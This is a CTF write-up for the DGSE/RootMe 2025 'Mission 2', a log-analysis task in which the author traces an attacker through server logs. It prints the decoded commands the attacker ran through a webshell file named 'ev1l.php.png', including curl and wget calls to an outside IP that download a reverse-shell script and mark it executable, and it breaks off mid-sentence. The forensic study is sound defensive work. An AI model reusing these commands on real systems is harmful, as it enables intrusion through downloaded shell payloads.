---
title : "DGSE CTF 2025 - Mission 2"
date : 2025-05-07
categories :
    - CTF
tags :
    - DGSE-CTF-2025
    - Write-up
    - RootMe
    - SOC
    - Log analysis
excerpt : "The second mission to take down the NullVastation organization during a CTF organized by the DGSE and RootMe. This one is about SOC log analysis."
---

This mission is the second part of a CTF, if you missed the first mission, you can check it out here : [DGSE CTF 2025 - Mission 1][mission1]

<div style="display: flex; align-items: center; gap: 20px;">
  <div style="flex: 1;">
    <p style="padding: 10px; border-left: 4px solid #ccc;">
      The allied organisation Nuclear Punk, which was attacked by the entity, has provided us with its logs to help us understand the techniques used by the attackers, as well as the various compromise vectors exploited.
      <br>
      <br>
      To identify the attacking group, you need to recover the request that enabled the attacker to successfully use the first vulnerability in the application, the name of the vulnerability (in the format below) used by the attacker to execute the command, the IP address of the server used by the attacker and the exact location of the file that enables persistence.
    </p>
  </div>
  <div style="flex: 1;">
    <img src="../../assets/images/DGS3-CTF/Mission2-SOC.png" alt="Mission2 SOC card" style="max-width: 100%; height: auto;" />
  </div>
</div>

## Recon

We have a compromised server logs and must identify 4 things :
- the first vulnerability used by the attacker
- the second vulnerability
- the IP the tools are from
- the path of the persistence file

We have two files, one containing network traffic logs and the other containing commands history.
I start with the traffic logs and take a look at the IP addresses requests statistics, none of them seems to stand out. I also check the other available fields such as reponses codes, methods, etc...

Globally, the statistics do not give me more clue.

## Filter things out

Since there is too much noise, I decide to put a very basic filter that searches for specific keywords typically used by attackers in their requests (in a real scenario, I think this filter would still show too much noise, but it is a CTF so I give it a try).

![Filter requests](../../assets/images/DGS3-CTF/Mission2-filter-requests.png)

I luckily found very few results

![Filter requests](../../assets/images/DGS3-CTF/Mission2-filter-requests-results.png)

These requests execute commands, encoded in Base64, via a file named `ev1l.php.png`. Decoding them gives these commands in clear text :
```bash
ls -la
whoami
pwd
ping -c 1 google.com
curl http[:]//163.172.67.201:49999/
wget http[:]//163.172.67.201:49999/s1mpl3-r3vsh3ll-vps.sh
chmod +x s1mpl3-r3vsh3ll-vps.sh
```

This way of executing commands is very suspicious, moreover, the commands ping an IP address, download a script and give them execution permission (it is probably a tool for further attack steps).
Here we obtained the IP address the tools are from which is the artifact number #3 : `163[.]172.67.201`

I decide to filter on what happened with the IP address that sent these requests a few minutes before, I notice 


[mission1]: http://localhost:4000/TheWatchNode/ctf/dgse-ctf-2025-m1/

